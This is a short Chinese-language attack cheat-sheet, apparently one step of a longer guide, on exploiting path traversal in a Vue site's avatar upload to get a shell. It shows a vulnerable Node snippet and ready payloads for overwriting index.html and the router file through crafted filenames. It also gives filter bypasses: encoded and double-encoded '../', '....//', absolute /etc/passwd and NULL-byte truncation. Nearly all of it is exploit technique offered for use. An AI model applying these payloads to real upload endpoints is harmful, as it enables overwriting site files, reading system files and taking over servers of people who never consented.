## 第 4 步: 路径穿越 + Vue 头像上传 getshell

```
脆弱代码(90% 后端直接拼接):
  const path = "/uploads/avatar/" + file.name;
  fs.writeFileSync(path, file.buffer);

利用:
  抓包 POST /api/user/avatar → 改 filename:
    filename="../../../public/index.html"
    filename="../../router/index.js"
  Vue 项目: /var/www/html/dist/ → 头像 /uploads/avatar/ → 跳 3-4 层

先确认洞(别急着拿 shell):
  filename=../test.txt → 访问 /uploads/test.txt 是否在上级目录
  ..;/test.txt (后端过滤 ../ 但没过滤 ..;)

绕过:
  1. 编码: ..%2f..%2f..%2fetc/passwd / 二次编码 ..%252f
  2. 规范化: ....//....//etc/passwd (过滤只删一次)
  3. 绝对路径: /etc/passwd
  4. NULL 截断(老 PHP): %00.jpg
```

